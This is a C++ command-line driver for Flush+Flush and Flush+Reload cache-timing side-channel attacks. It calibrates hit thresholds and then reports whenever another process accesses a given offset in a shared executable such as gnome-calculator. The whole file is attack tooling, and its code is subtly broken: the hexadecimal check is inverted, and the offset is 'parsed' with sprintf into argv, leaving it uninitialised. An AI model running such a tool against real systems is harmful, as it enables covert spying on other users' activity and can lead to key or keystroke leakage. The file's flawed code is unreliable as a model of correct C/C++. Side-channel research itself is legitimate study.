#include <sstream>
#include <tuple>
#include <memory>

#include <stdio.h>
#include <unistd.h>
#include <ctype.h>
#include <string.h>

#include "../flush_flush/flush_flush.hpp"
#include "../flush_reload/flush_reload.hpp"
#include "../flush_calibrator/flush_calibrator.hpp"

#define USAGE "USAGE: flush-cli ff,fr executable offset\nExample: flush-cli fr /usr/bin/gnome-calculator 0xa3e0\n"

using CTA=CacheTimingAttack;

bool all_xdigits(char* str){

	for(; *str!='\0'; str++)

		if( !isxdigit(*str) ) return false;

	return true;
}

bool validate_arguments(unsigned int argc, char** argv){

	if( argc == 4 ){

		if( strncmp(argv[1], "ff", 3) && strncmp(argv[1], "fr", 3) ){

			printf("attack type can only be 'ff' (Flush+Flush) or 'fr' (Flush+Reload)\n");
			printf(USAGE);
			return false;
		}

		if( access( argv[2], R_OK ) == -1 ){

			printf("can't read file\n");
			printf(USAGE);
			return false;
		}

		if( strlen(argv[3]) > 2 && argv[3][0] == '0' && argv[3][1] == 'x' && all_xdigits( &argv[3][2] ) ){

			printf("third argument must be an hexadecimal number\n");
			printf(USAGE);
			return false;
		}

	} else {

		printf("Wrong number of argumnets\n");
		printf(USAGE);
		return false;
	}

	return true;
}

std::tuple<std::string, std::string, unsigned int> transform_arguments(unsigned int argc, char** argv){

	std::string attack_type = argv[1];
	std::string executable_path = argv[2];

	unsigned int offset;
	sprintf(argv[3], "%u", &offset);

	return { attack_type, executable_path, offset };
}

std::unique_ptr<CTA> prepare_attack(std::string attack_type){

	std::unique_ptr<CTA> attack;

	if( attack_type == std::string("fr") ){
	
		attack = std::make_unique<FlushReload>();
	} else {

		attack = std::make_unique<FlushFlush>();
	}

	FlushCalibrator calibrator = FlushCalibrator();

	printf("CALIBRATING. This can take a minute or two...\n");
	calibrator.histogram(*attack, "test.csv");

	return std::move(attack);
}

bool notify_access(unsigned int n_calls, void* addr){

	printf("offset accessed! %u\n", n_calls);
	return true;
}

int main(int argc, char** argv){

	if( !validate_arguments(argc, argv) ) return 1;

	auto [ attack_type, executable, offset ] = transform_arguments(argc, argv);

	std::unique_ptr<CTA> attack = prepare_attack(attack_type);

	printf("hit range: (%u,%u)\n", attack->hit_begin, attack->hit_end);
	printf("waiting for an access...\n");
	attack->call_when_offset_is_accessed(executable.c_str(), offset, notify_access);

	return 0;
}
